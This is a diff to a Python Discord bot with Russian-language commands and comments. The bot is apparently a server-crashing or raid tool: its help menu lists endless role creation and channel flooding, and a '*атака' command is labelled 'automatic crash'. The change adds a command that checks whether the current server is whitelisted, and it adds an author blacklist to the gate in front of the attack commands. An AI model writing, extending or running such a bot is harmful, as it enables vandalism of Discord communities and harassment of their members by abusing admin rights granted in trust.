@@ -35,7 +35,14 @@ class MyClient(discord.Client):
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
 			embed.add_field(name='*флуд', value='Зафлудить текущий канал', inline=False)
 			await message.author.send(embed=embed)
-		if white.find(str(message.guild.id)) == -1:
+			
+		if message.content == '*бс':
+			await message.delete()
+			if white.find(str(message.guild.id)) == -1:
+				await message.author.send(':x: Сервер не находится в белом списке.')
+			else:
+				await message.author.send(':white_check_mark: Сервер находится в белом списке.')
+		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
